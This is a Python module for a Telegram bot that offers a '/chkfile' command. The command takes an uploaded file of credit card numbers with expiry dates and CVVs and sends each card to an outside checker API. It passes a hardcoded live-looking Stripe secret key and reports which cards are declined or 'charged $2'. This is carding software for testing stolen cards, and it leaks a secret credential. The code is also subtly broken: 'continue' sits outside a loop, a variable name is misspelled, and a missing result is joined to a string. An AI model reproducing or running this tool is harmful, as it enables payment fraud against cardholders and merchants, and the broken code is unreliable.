from EQUROBOT import app
import aiohttp
import asyncio
import re
import os
from pyrogram import filters

async def process_credit_card(cc_entry, message):
    try:
        x = re.findall(r'\d+', cc_entry)
        if len(x) != 4:
            print(f'Invalid CC format in file: {cc_entry}')
            continue
        
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]

        VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
        if not ccn.startswith(VALID):
            print(f'Invalid CC type in file: {cc_entry}')
            continue

        async with aiohttp.ClientSession() as session:
            url = "https://mvy.ai/sk_api/api.php"
            params = {
                "lista": f"{ccn}:{mm}:{yy}:{cvv}",
                "sk": "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"
            }

            async with session.get(url, params=params) as response:
                r = await response.json()

                if r['status'] == 'die':
                    fullcc = f"{ccn}|{mm}|{yy}|{cvv}"
                    die = f"{fullcc}\n𝖣𝖤𝖢𝖫𝖨𝖭𝖤𝖣 ❌ - {r['message']}\n\n"
                    return die

                elif r['status'] == 'approved':
                    fullcc = f"{ccn}|{mm}|{yy}|{cvv}"
                    approved = f"{fullccc}\n𝖲𝖳𝖱𝖨𝖯𝖤 𝖠𝖴𝖳𝖧 $2 ✅ - {r['message']} - CHARGED ${r['payment_info']['amount']}\n\n"
                    return approved
                else:
                    mm = "Unknown status received.\n\n"
                    return mm

    except Exception as e:
        print(f"Error processing CC entry: {e}")


@app.on_message(filters.command("chkfile", prefixes=[".", "/"]))
async def check_cc_file(_, message):
    try:
        reply_msg = message.reply_to_message
        if reply_msg and reply_msg.document:
            vj = ""
            file_id = reply_msg.document.file_id
            file_path = await app.download_media(file_id)

            with open(file_path, 'r') as file:
                tasks = []
                for line in file:
                    cc_entry = line.strip()
                    task = asyncio.create_task(process_credit_card(cc_entry, message))
                    tasks.append(task)

                results = await asyncio.gather(*tasks)
                for result in results:
                    vj += result
                with open(f'{message.from_user.id}.txt', 'a') as f:
                    f.write(f"{vj}")
                await message.reply_document(f"{message.from_user.id}.txt")
            os.remove(file_path)
            os.remove(f"{message.from_user.id}.txt")
        else:
            await message.reply_text("Please reply to a text file containing credit card details.")

    except Exception as e:
        await message.reply_text(f"Error reading CC file: {e}")
